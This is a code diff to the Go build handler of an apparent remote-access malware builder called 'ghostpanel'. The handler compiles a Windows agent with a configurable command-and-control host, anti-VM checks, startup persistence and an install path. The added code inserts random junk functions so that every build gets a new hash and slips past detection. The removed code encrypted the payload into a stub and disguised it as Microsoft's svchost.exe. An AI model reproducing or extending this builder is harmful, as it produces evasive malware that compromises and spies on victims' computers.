@@ -7,10 +7,10 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
-	"ghostpanel/builder"
 	"sync"
+	"math/rand"
+	"time"
 )
 
 type BuildRequest struct {
@@ -26,23 +26,31 @@ type BuildRequest struct {
 
 var buildLock sync.Mutex
 
-// Ensure core object exists
+// Generate random junk function for polymorphism
+func generateJunkCode() string {
+	rand.Seed(time.Now().UnixNano())
+	junk := "\n// Junk Code\nextern \"C\" void Junk_" + fmt.Sprintf("%d", rand.Intn(100000)) + "() {\n"
+	junk += fmt.Sprintf("    volatile int x = %d;\n", rand.Intn(1000))
+	junk += fmt.Sprintf("    for(int i=0; i<%d; i++) x ^= i;\n", rand.Intn(5000))
+	junk += "}\n"
+	return junk
+}
+
 func ensureCoreObject() error {
 	coreObj := "../output/agent_core.o"
 	if _, err := os.Stat(coreObj); err == nil {
-		return nil // Already exists
+		return nil 
 	}
 
-	fmt.Println("[*] Compiling Agent Core Object (This happens once)...")
+	fmt.Println("[*] Compiling Agent Core Object (No linking)...")
 	os.MkdirAll("../output", 0755)
 
-	// Compile agent.cpp to object file ONLY (no linking)
 	args := []string{
 		"-c", "templates/agent.cpp",
 		"-o", coreObj,
 		"-m64", "-fPIE", 
 		"-D_WIN32_WINNT=0x0600", "-D_CRT_SECURE_NO_WARNINGS",
-		"-Os", "-s", // Optimize size & strip symbols
+		"-Os", "-s", "-fvisibility=hidden", "-fno-rtti", "-fno-exceptions",
 	}
 
 	cmd := exec.Command("x86_64-w64-mingw32-g++", args...)
@@ -78,13 +86,8 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 1. Prepare Config Source
-	configTemplate, err := ioutil.ReadFile("templates/config.cpp")
-	if err != nil {
-		http.Error(w, "Config template not found", 500)
-		return
-	}
-
+	// 1. Config + Junk Code
+	configTemplate, _ := ioutil.ReadFile("templates/config.cpp")
 	cfg := LoadConfig()
 	code := string(configTemplate)
 	code = strings.ReplaceAll(code, "{{HOST}}", req.Host)
@@ -95,15 +98,19 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	
 	if req.AntiVM { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") } else { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") }
 	if req.Startup { code = strings.ReplaceAll(code, "{{STARTUP}}", "1") } else { code = strings.ReplaceAll(code, "{{STARTUP}}", "0") }
+	
 	installEnv := "APPDATA"
 	if req.InstallPath == "%TEMP%" { installEnv = "TEMP" }
 	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)
+
+	// Add Random Junk to change Hash
+	code += generateJunkCode()
 
 	tempConfigSrc := "templates/temp_config.cpp"
 	tempConfigObj := "templates/temp_config.o"
 	ioutil.WriteFile(tempConfigSrc, []byte(code), 0644)
 
-	// 2. Compile Config Object
+	// 2. Compile Config
 	cmdConf := exec.Command("x86_64-w64-mingw32-g++", "-c", tempConfigSrc, "-o", tempConfigObj, "-m64", "-Os")
 	if out, err := cmdConf.CombinedOutput(); err != nil {
 		w.WriteHeader(500)
@@ -113,75 +120,23 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	defer os.Remove(tempConfigSrc)
 	defer os.Remove(tempConfigObj)
 
-	// 3. Link Core + Config -> DLL (Payload)
-	tempPayload := "../output/payload.dll"
+	// 3. Link All -> Final EXE
+	finalOutput := "../output/payload.exe"
 	
 	linkArgs := []string{
-		"-o", tempPayload, 
-		"../output/agent_core.o", tempConfigObj, // Link objects
-		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", 
-		"-lole32", "-loleaut32", "-luuid", 
-		"-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
+		"-o", finalOutput, 
+		"../output/agent_core.o", tempConfigObj,
+		"-mwindows", // GUI App (No Console)
+		"-static", "-m64", "-s", "-Os",
+		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", "-lole32", "-loleaut32", 
+		"-luuid", "-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
 		"-lstrmiids", "-lwbemuuid",
-		"-static", "-s", "-m64", "-shared", "-Wl,--subsystem,windows", // DLL & GUI Subsystem
 	}
 
 	cmdLink := exec.Command("x86_64-w64-mingw32-g++", linkArgs...)
 	if out, err := cmdLink.CombinedOutput(); err != nil {
 		w.WriteHeader(500)
 		json.NewEncoder(w).Encode(map[string]string{"error": "Linking Failed: " + string(out)})
-		return
-	}
-	defer os.Remove(tempPayload)
-
-	// 4. Encrypt Payload
-	payloadBytes, _ := ioutil.ReadFile(tempPayload)
-	encryptedBytes, keyStr := builder.EncryptPayload(payloadBytes)
-	
-	// 5. Prepare Stub & Resource
-	stubTemplate, _ := ioutil.ReadFile("templates/stub.cpp")
-	stubCode := string(stubTemplate)
-	stubCode = strings.ReplaceAll(stubCode, "{{KEY}}", keyStr)
-	
-tempStub := "templates/temp_stub.cpp"
-	ioutil.WriteFile(tempStub, []byte(stubCode), 0644)
-
-	encPayloadFile := "templates/payload.dat"
-	ioutil.WriteFile(encPayloadFile, encryptedBytes, 0644)
-	
-	// Create resource script
-	resContent := "#include <windows.h>\n101 RCDATA \"payload.dat\"\n"
-	// Append Version Info (Simple Fake)
-	resContent += "1 VERSIONINFO FILEVERSION 1,0,0,0 PRODUCTVERSION 1,0,0,0 FILEOS 0x40004 FILETYPE 0x1 { BLOCK \"StringFileInfo\" { BLOCK \"040904b0\" { VALUE \"CompanyName\", \"Microsoft Corporation\" VALUE \"FileDescription\", \"Service Host\" VALUE \"InternalName\", \"svchost\" VALUE \"OriginalFilename\", \"svchost.exe\" VALUE \"ProductName\", \"Windows\" VALUE \"ProductVersion\", \"10.0.19041.1\" } } BLOCK \"VarFileInfo\" { VALUE \"Translation\", 0x409, 1200 } }"
-	
-tempResFile := "templates/temp_resource.rc"
-	ioutil.WriteFile(tempResFile, []byte(resContent), 0644)
-
-	resObj := "../output/resource.o"
-	absOut, _ := filepath.Abs(resObj)
-	resCmd := exec.Command("x86_64-w64-mingw32-windres", "-F", "pe-x86-64", "temp_resource.rc", "-o", absOut)
-	resCmd.Dir = "templates"
-	if out, err := resCmd.CombinedOutput(); err != nil {
-		w.WriteHeader(500)
-		json.NewEncoder(w).Encode(map[string]string{"error": "Resource Build Failed: " + string(out)})
-		return
-	}
-
-	defer os.Remove(encPayloadFile)
-	defer os.Remove(tempResFile)
-	defer os.Remove(tempStub)
-
-	// 6. Final Stub Link
-	finalOutput := "../output/payload.exe"
-	stubArgs := []string{
-		"-o", finalOutput, tempStub, resObj,
-		"-static", "-m64", "-s", "-Os", // Strip & Optimize
-		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", "-lole32", "-loleaut32", "-luuid", "-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lstrmiids",
-	}
-	stubCmd := exec.Command("x86_64-w64-mingw32-g++", stubArgs...)
-	if out, err := stubCmd.CombinedOutput(); err != nil {
-		w.WriteHeader(500)
-		json.NewEncoder(w).Encode(map[string]string{"error": "Stub Build Failed: " + string(out)})
 		return
 	}
 
